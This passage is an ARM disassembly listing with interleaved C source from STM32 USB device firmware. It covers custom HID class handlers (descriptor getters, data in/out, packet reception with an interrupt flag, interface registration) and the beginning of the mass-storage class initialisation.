 8008c68:	46bd      	mov	sp, r7
 8008c6a:	bd80      	pop	{r7, pc}
 8008c6c:	20000064 	.word	0x20000064

08008c70 <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 8008c70:	b580      	push	{r7, lr}
 8008c72:	b084      	sub	sp, #16
 8008c74:	af00      	add	r7, sp, #0
 8008c76:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008c78:	2181      	movs	r1, #129	; 0x81
 8008c7a:	4815      	ldr	r0, [pc, #84]	; (8008cd0 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008c7c:	f002 fd00 	bl	800b680 <USBD_GetEpDesc>
 8008c80:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008c82:	2101      	movs	r1, #1
 8008c84:	4812      	ldr	r0, [pc, #72]	; (8008cd0 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008c86:	f002 fcfb 	bl	800b680 <USBD_GetEpDesc>
 8008c8a:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008c8c:	68fb      	ldr	r3, [r7, #12]
 8008c8e:	2b00      	cmp	r3, #0
 8008c90:	d009      	beq.n	8008ca6 <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008c92:	68fb      	ldr	r3, [r7, #12]
 8008c94:	2200      	movs	r2, #0
 8008c96:	f042 0202 	orr.w	r2, r2, #2
 8008c9a:	711a      	strb	r2, [r3, #4]
 8008c9c:	2200      	movs	r2, #0
 8008c9e:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008ca0:	68fb      	ldr	r3, [r7, #12]
 8008ca2:	2205      	movs	r2, #5
 8008ca4:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008ca6:	68bb      	ldr	r3, [r7, #8]
 8008ca8:	2b00      	cmp	r3, #0
 8008caa:	d009      	beq.n	8008cc0 <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008cac:	68bb      	ldr	r3, [r7, #8]
 8008cae:	2200      	movs	r2, #0
 8008cb0:	f042 0202 	orr.w	r2, r2, #2
 8008cb4:	711a      	strb	r2, [r3, #4]
 8008cb6:	2200      	movs	r2, #0
 8008cb8:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008cba:	68bb      	ldr	r3, [r7, #8]
 8008cbc:	2205      	movs	r2, #5
 8008cbe:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008cc0:	687b      	ldr	r3, [r7, #4]
 8008cc2:	2229      	movs	r2, #41	; 0x29
 8008cc4:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008cc6:	4b02      	ldr	r3, [pc, #8]	; (8008cd0 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008cc8:	4618      	mov	r0, r3
 8008cca:	3710      	adds	r7, #16
 8008ccc:	46bd      	mov	sp, r7
 8008cce:	bd80      	pop	{r7, pc}
 8008cd0:	20000064 	.word	0x20000064

08008cd4 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008cd4:	b580      	push	{r7, lr}
 8008cd6:	b084      	sub	sp, #16
 8008cd8:	af00      	add	r7, sp, #0
 8008cda:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008cdc:	2181      	movs	r1, #129	; 0x81
 8008cde:	4815      	ldr	r0, [pc, #84]	; (8008d34 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008ce0:	f002 fcce 	bl	800b680 <USBD_GetEpDesc>
 8008ce4:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008ce6:	2101      	movs	r1, #1
 8008ce8:	4812      	ldr	r0, [pc, #72]	; (8008d34 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008cea:	f002 fcc9 	bl	800b680 <USBD_GetEpDesc>
 8008cee:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008cf0:	68fb      	ldr	r3, [r7, #12]
 8008cf2:	2b00      	cmp	r3, #0
 8008cf4:	d009      	beq.n	8008d0a <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008cf6:	68fb      	ldr	r3, [r7, #12]
 8008cf8:	2200      	movs	r2, #0
 8008cfa:	f042 0202 	orr.w	r2, r2, #2
 8008cfe:	711a      	strb	r2, [r3, #4]
 8008d00:	2200      	movs	r2, #0
 8008d02:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008d04:	68fb      	ldr	r3, [r7, #12]
 8008d06:	2205      	movs	r2, #5
 8008d08:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008d0a:	68bb      	ldr	r3, [r7, #8]
 8008d0c:	2b00      	cmp	r3, #0
 8008d0e:	d009      	beq.n	8008d24 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008d10:	68bb      	ldr	r3, [r7, #8]
 8008d12:	2200      	movs	r2, #0
 8008d14:	f042 0202 	orr.w	r2, r2, #2
 8008d18:	711a      	strb	r2, [r3, #4]
 8008d1a:	2200      	movs	r2, #0
 8008d1c:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008d1e:	68bb      	ldr	r3, [r7, #8]
 8008d20:	2205      	movs	r2, #5
 8008d22:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008d24:	687b      	ldr	r3, [r7, #4]
 8008d26:	2229      	movs	r2, #41	; 0x29
 8008d28:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008d2a:	4b02      	ldr	r3, [pc, #8]	; (8008d34 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008d2c:	4618      	mov	r0, r3
 8008d2e:	3710      	adds	r7, #16
 8008d30:	46bd      	mov	sp, r7
 8008d32:	bd80      	pop	{r7, pc}
 8008d34:	20000064 	.word	0x20000064

08008d38 <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008d38:	b480      	push	{r7}
 8008d3a:	b083      	sub	sp, #12
 8008d3c:	af00      	add	r7, sp, #0
 8008d3e:	6078      	str	r0, [r7, #4]
 8008d40:	460b      	mov	r3, r1
 8008d42:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008d44:	687b      	ldr	r3, [r7, #4]
 8008d46:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d4a:	687b      	ldr	r3, [r7, #4]
 8008d4c:	32b0      	adds	r2, #176	; 0xb0
 8008d4e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008d52:	2200      	movs	r2, #0
 8008d54:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008d58:	2300      	movs	r3, #0
}
 8008d5a:	4618      	mov	r0, r3
 8008d5c:	370c      	adds	r7, #12
 8008d5e:	46bd      	mov	sp, r7
 8008d60:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008d64:	4770      	bx	lr

08008d66 <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008d66:	b580      	push	{r7, lr}
 8008d68:	b084      	sub	sp, #16
 8008d6a:	af00      	add	r7, sp, #0
 8008d6c:	6078      	str	r0, [r7, #4]
 8008d6e:	460b      	mov	r3, r1
 8008d70:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008d72:	687b      	ldr	r3, [r7, #4]
 8008d74:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d78:	687b      	ldr	r3, [r7, #4]
 8008d7a:	32b0      	adds	r2, #176	; 0xb0
 8008d7c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008d80:	2b00      	cmp	r3, #0
 8008d82:	d101      	bne.n	8008d88 <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008d84:	2303      	movs	r3, #3
 8008d86:	e017      	b.n	8008db8 <USBD_CUSTOM_HID_DataOut+0x52>
  }

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008d88:	687b      	ldr	r3, [r7, #4]
 8008d8a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d8e:	687b      	ldr	r3, [r7, #4]
 8008d90:	32b0      	adds	r2, #176	; 0xb0
 8008d92:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008d96:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008d98:	687b      	ldr	r3, [r7, #4]
 8008d9a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008d9e:	687a      	ldr	r2, [r7, #4]
 8008da0:	33b0      	adds	r3, #176	; 0xb0
 8008da2:	009b      	lsls	r3, r3, #2
 8008da4:	4413      	add	r3, r2
 8008da6:	685b      	ldr	r3, [r3, #4]
 8008da8:	68db      	ldr	r3, [r3, #12]
 8008daa:	68fa      	ldr	r2, [r7, #12]
 8008dac:	7810      	ldrb	r0, [r2, #0]
 8008dae:	68fa      	ldr	r2, [r7, #12]
 8008db0:	7852      	ldrb	r2, [r2, #1]
 8008db2:	4611      	mov	r1, r2
 8008db4:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008db6:	2300      	movs	r3, #0
}
 8008db8:	4618      	mov	r0, r3
 8008dba:	3710      	adds	r7, #16
 8008dbc:	46bd      	mov	sp, r7
 8008dbe:	bd80      	pop	{r7, pc}

08008dc0 <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008dc0:	b580      	push	{r7, lr}
 8008dc2:	b084      	sub	sp, #16
 8008dc4:	af00      	add	r7, sp, #0
 8008dc6:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008dc8:	687b      	ldr	r3, [r7, #4]
 8008dca:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008dce:	687b      	ldr	r3, [r7, #4]
 8008dd0:	32b0      	adds	r2, #176	; 0xb0
 8008dd2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008dd6:	2b00      	cmp	r3, #0
 8008dd8:	d101      	bne.n	8008dde <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008dda:	2303      	movs	r3, #3
 8008ddc:	e01c      	b.n	8008e18 <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008dde:	687b      	ldr	r3, [r7, #4]
 8008de0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008de4:	687b      	ldr	r3, [r7, #4]
 8008de6:	32b0      	adds	r2, #176	; 0xb0
 8008de8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008dec:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008dee:	4b0c      	ldr	r3, [pc, #48]	; (8008e20 <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008df0:	7819      	ldrb	r1, [r3, #0]
 8008df2:	68fa      	ldr	r2, [r7, #12]
 8008df4:	230f      	movs	r3, #15
 8008df6:	6878      	ldr	r0, [r7, #4]
 8008df8:	f004 f920 	bl	800d03c <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008dfc:	68fb      	ldr	r3, [r7, #12]
 8008dfe:	781a      	ldrb	r2, [r3, #0]
 8008e00:	4b08      	ldr	r3, [pc, #32]	; (8008e24 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008e02:	701a      	strb	r2, [r3, #0]
 8008e04:	4b07      	ldr	r3, [pc, #28]	; (8008e24 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008e06:	781b      	ldrb	r3, [r3, #0]
 8008e08:	f003 0302 	and.w	r3, r3, #2
 8008e0c:	2b02      	cmp	r3, #2
 8008e0e:	d002      	beq.n	8008e16 <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008e10:	4b05      	ldr	r3, [pc, #20]	; (8008e28 <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008e12:	2201      	movs	r2, #1
 8008e14:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008e16:	2300      	movs	r3, #0
}
 8008e18:	4618      	mov	r0, r3
 8008e1a:	3710      	adds	r7, #16
 8008e1c:	46bd      	mov	sp, r7
 8008e1e:	bd80      	pop	{r7, pc}
 8008e20:	200000a7 	.word	0x200000a7
 8008e24:	2000026c 	.word	0x2000026c
 8008e28:	20000270 	.word	0x20000270

08008e2c <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008e2c:	b580      	push	{r7, lr}
 8008e2e:	b084      	sub	sp, #16
 8008e30:	af00      	add	r7, sp, #0
 8008e32:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008e34:	687b      	ldr	r3, [r7, #4]
 8008e36:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e3a:	687b      	ldr	r3, [r7, #4]
 8008e3c:	32b0      	adds	r2, #176	; 0xb0
 8008e3e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e42:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008e44:	68fb      	ldr	r3, [r7, #12]
 8008e46:	2b00      	cmp	r3, #0
 8008e48:	d101      	bne.n	8008e4e <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008e4a:	2303      	movs	r3, #3
 8008e4c:	e016      	b.n	8008e7c <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008e4e:	68fb      	ldr	r3, [r7, #12]
 8008e50:	69db      	ldr	r3, [r3, #28]
 8008e52:	2b01      	cmp	r3, #1
 8008e54:	d111      	bne.n	8008e7a <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008e56:	687b      	ldr	r3, [r7, #4]
 8008e58:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008e5c:	687a      	ldr	r2, [r7, #4]
 8008e5e:	33b0      	adds	r3, #176	; 0xb0
 8008e60:	009b      	lsls	r3, r3, #2
 8008e62:	4413      	add	r3, r2
 8008e64:	685b      	ldr	r3, [r3, #4]
 8008e66:	68db      	ldr	r3, [r3, #12]
 8008e68:	68fa      	ldr	r2, [r7, #12]
 8008e6a:	7810      	ldrb	r0, [r2, #0]
 8008e6c:	68fa      	ldr	r2, [r7, #12]
 8008e6e:	7852      	ldrb	r2, [r2, #1]
 8008e70:	4611      	mov	r1, r2
 8008e72:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008e74:	68fb      	ldr	r3, [r7, #12]
 8008e76:	2200      	movs	r2, #0
 8008e78:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008e7a:	2300      	movs	r3, #0
}
 8008e7c:	4618      	mov	r0, r3
 8008e7e:	3710      	adds	r7, #16
 8008e80:	46bd      	mov	sp, r7
 8008e82:	bd80      	pop	{r7, pc}

08008e84 <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008e84:	b480      	push	{r7}
 8008e86:	b083      	sub	sp, #12
 8008e88:	af00      	add	r7, sp, #0
 8008e8a:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008e8c:	687b      	ldr	r3, [r7, #4]
 8008e8e:	220a      	movs	r2, #10
 8008e90:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008e92:	4b03      	ldr	r3, [pc, #12]	; (8008ea0 <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008e94:	4618      	mov	r0, r3
 8008e96:	370c      	adds	r7, #12
 8008e98:	46bd      	mov	sp, r7
 8008e9a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008e9e:	4770      	bx	lr
 8008ea0:	2000009c 	.word	0x2000009c

08008ea4 <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008ea4:	b480      	push	{r7}
 8008ea6:	b083      	sub	sp, #12
 8008ea8:	af00      	add	r7, sp, #0
 8008eaa:	6078      	str	r0, [r7, #4]
 8008eac:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008eae:	683b      	ldr	r3, [r7, #0]
 8008eb0:	2b00      	cmp	r3, #0
 8008eb2:	d101      	bne.n	8008eb8 <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008eb4:	2303      	movs	r3, #3
 8008eb6:	e009      	b.n	8008ecc <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008eb8:	687b      	ldr	r3, [r7, #4]
 8008eba:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008ebe:	687a      	ldr	r2, [r7, #4]
 8008ec0:	33b0      	adds	r3, #176	; 0xb0
 8008ec2:	009b      	lsls	r3, r3, #2
 8008ec4:	4413      	add	r3, r2
 8008ec6:	683a      	ldr	r2, [r7, #0]
 8008ec8:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008eca:	2300      	movs	r3, #0
}
 8008ecc:	4618      	mov	r0, r3
 8008ece:	370c      	adds	r7, #12
 8008ed0:	46bd      	mov	sp, r7
 8008ed2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008ed6:	4770      	bx	lr

08008ed8 <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008ed8:	b580      	push	{r7, lr}
 8008eda:	b084      	sub	sp, #16
 8008edc:	af00      	add	r7, sp, #0
 8008ede:	6078      	str	r0, [r7, #4]
 8008ee0:	460b      	mov	r3, r1
 8008ee2:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008ee4:	f241 0074 	movw	r0, #4212	; 0x1074
 8008ee8:	f004 f938 	bl	800d15c <USBD_static_malloc_MSC>
 8008eec:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008eee:	68fb      	ldr	r3, [r7, #12]
 8008ef0:	2b00      	cmp	r3, #0
 8008ef2:	d109      	bne.n	8008f08 <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008ef4:	687b      	ldr	r3, [r7, #4]
 8008ef6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008efa:	687b      	ldr	r3, [r7, #4]
 8008efc:	32b0      	adds	r2, #176	; 0xb0
 8008efe:	2100      	movs	r1, #0
 8008f00:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008f04:	2302      	movs	r3, #2
 8008f06:	e06e      	b.n	8008fe6 <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008f08:	687b      	ldr	r3, [r7, #4]
 8008f0a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f0e:	687b      	ldr	r3, [r7, #4]
 8008f10:	32b0      	adds	r2, #176	; 0xb0
 8008f12:	68f9      	ldr	r1, [r7, #12]
 8008f14:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008f18:	687b      	ldr	r3, [r7, #4]
 8008f1a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f1e:	687b      	ldr	r3, [r7, #4]
 8008f20:	32b0      	adds	r2, #176	; 0xb0
 8008f22:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008f26:	687b      	ldr	r3, [r7, #4]
 8008f28:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008f2c:	687b      	ldr	r3, [r7, #4]
 8008f2e:	7c1b      	ldrb	r3, [r3, #16]
 8008f30:	2b00      	cmp	r3, #0
 8008f32:	d12b      	bne.n	8008f8c <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008f34:	4b2e      	ldr	r3, [pc, #184]	; (8008ff0 <USBD_MSC_Init+0x118>)
 8008f36:	7819      	ldrb	r1, [r3, #0]
 8008f38:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008f3c:	2202      	movs	r2, #2
 8008f3e:	6878      	ldr	r0, [r7, #4]
 8008f40:	f003 feca 	bl	800ccd8 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008f44:	4b2a      	ldr	r3, [pc, #168]	; (8008ff0 <USBD_MSC_Init+0x118>)
 8008f46:	781b      	ldrb	r3, [r3, #0]
 8008f48:	f003 020f 	and.w	r2, r3, #15
 8008f4c:	6879      	ldr	r1, [r7, #4]
 8008f4e:	4613      	mov	r3, r2
 8008f50:	009b      	lsls	r3, r3, #2
 8008f52:	4413      	add	r3, r2
 8008f54:	009b      	lsls	r3, r3, #2
 8008f56:	440b      	add	r3, r1
 8008f58:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008f5c:	2201      	movs	r2, #1
 8008f5e:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008f60:	4b24      	ldr	r3, [pc, #144]	; (8008ff4 <USBD_MSC_Init+0x11c>)
 8008f62:	7819      	ldrb	r1, [r3, #0]
 8008f64:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008f68:	2202      	movs	r2, #2
 8008f6a:	6878      	ldr	r0, [r7, #4]
 8008f6c:	f003 feb4 	bl	800ccd8 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008f70:	4b20      	ldr	r3, [pc, #128]	; (8008ff4 <USBD_MSC_Init+0x11c>)
 8008f72:	781b      	ldrb	r3, [r3, #0]
 8008f74:	f003 020f 	and.w	r2, r3, #15
 8008f78:	6879      	ldr	r1, [r7, #4]
 8008f7a:	4613      	mov	r3, r2
 8008f7c:	009b      	lsls	r3, r3, #2
 8008f7e:	4413      	add	r3, r2
 8008f80:	009b      	lsls	r3, r3, #2
 8008f82:	440b      	add	r3, r1
 8008f84:	3324      	adds	r3, #36	; 0x24
 8008f86:	2201      	movs	r2, #1
 8008f88:	801a      	strh	r2, [r3, #0]
 8008f8a:	e028      	b.n	8008fde <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008f8c:	4b18      	ldr	r3, [pc, #96]	; (8008ff0 <USBD_MSC_Init+0x118>)
 8008f8e:	7819      	ldrb	r1, [r3, #0]
 8008f90:	2340      	movs	r3, #64	; 0x40
 8008f92:	2202      	movs	r2, #2
 8008f94:	6878      	ldr	r0, [r7, #4]
 8008f96:	f003 fe9f 	bl	800ccd8 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008f9a:	4b15      	ldr	r3, [pc, #84]	; (8008ff0 <USBD_MSC_Init+0x118>)
 8008f9c:	781b      	ldrb	r3, [r3, #0]
 8008f9e:	f003 020f 	and.w	r2, r3, #15
 8008fa2:	6879      	ldr	r1, [r7, #4]
 8008fa4:	4613      	mov	r3, r2
 8008fa6:	009b      	lsls	r3, r3, #2
 8008fa8:	4413      	add	r3, r2
 8008faa:	009b      	lsls	r3, r3, #2
 8008fac:	440b      	add	r3, r1
 8008fae:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008fb2:	2201      	movs	r2, #1
 8008fb4:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008fb6:	4b0f      	ldr	r3, [pc, #60]	; (8008ff4 <USBD_MSC_Init+0x11c>)
 8008fb8:	7819      	ldrb	r1, [r3, #0]
 8008fba:	2340      	movs	r3, #64	; 0x40
 8008fbc:	2202      	movs	r2, #2
 8008fbe:	6878      	ldr	r0, [r7, #4]
 8008fc0:	f003 fe8a 	bl	800ccd8 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008fc4:	4b0b      	ldr	r3, [pc, #44]	; (8008ff4 <USBD_MSC_Init+0x11c>)
 8008fc6:	781b      	ldrb	r3, [r3, #0]
 8008fc8:	f003 020f 	and.w	r2, r3, #15
 8008fcc:	6879      	ldr	r1, [r7, #4]
 8008fce:	4613      	mov	r3, r2
 8008fd0:	009b      	lsls	r3, r3, #2
